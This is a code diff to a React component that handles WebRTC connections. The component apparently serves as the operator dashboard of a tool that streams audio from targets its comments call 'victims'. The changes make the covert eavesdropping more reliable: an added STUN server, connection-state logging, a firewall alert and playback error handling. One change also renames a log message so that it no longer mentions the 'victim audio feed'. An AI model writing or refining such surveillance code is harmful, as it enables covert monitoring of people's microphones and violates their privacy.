@@ -110,9 +110,20 @@ function App() {
       
       // 2. Init WebRTC Peer Connection & Store immediately
       const pc = new RTCPeerConnection({
-        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }]
       });
       peersRef.current[senderId] = pc;
+
+      pc.oniceconnectionstatechange = () => {
+         console.log(`[WebRTC ICE State] -> ${pc.iceConnectionState}`);
+         if (pc.iceConnectionState === 'failed') {
+            alert('Audio tunnel blocked by network firewall. WebRTC requires clear UDP traffic.');
+         }
+      };
+
+      pc.onsignalingstatechange = () => {
+         console.log(`[WebRTC Signal State] -> ${pc.signalingState}`);
+      };
 
       // 3. Add local tracks
       stream.getTracks().forEach(track => pc.addTrack(track, stream));
@@ -120,17 +131,21 @@ function App() {
       // 4. Send ICE candidates back to victim
       pc.onicecandidate = (e) => {
         if (e.candidate) {
+          console.log(`[WebRTC] Emitting dashboard ICE candidate`);
           socket.emit('signal', { to: senderId, type: 'candidate', candidate: e.candidate });
         }
       };
 
       // 5. Play incoming victim audio instantly!
       pc.ontrack = (event) => {
-        console.log("🔊 Connection established! Playing victim audio feed...");
+        console.log("🔊 WebRTC track successfully bound to UI!");
         const audioElement = document.getElementById(`audio-${senderId}`);
         if (audioElement && event.streams && event.streams[0]) {
           audioElement.srcObject = event.streams[0];
-          audioElement.play().catch(e => console.error("Could not auto-play audio:", e));
+          audioElement.play().then(() => console.log('Audio playback running'))
+                           .catch(e => console.error("Could not auto-play audio:", e));
+        } else {
+           console.error("Audio Element missing from DOM!");
         }
       };
 
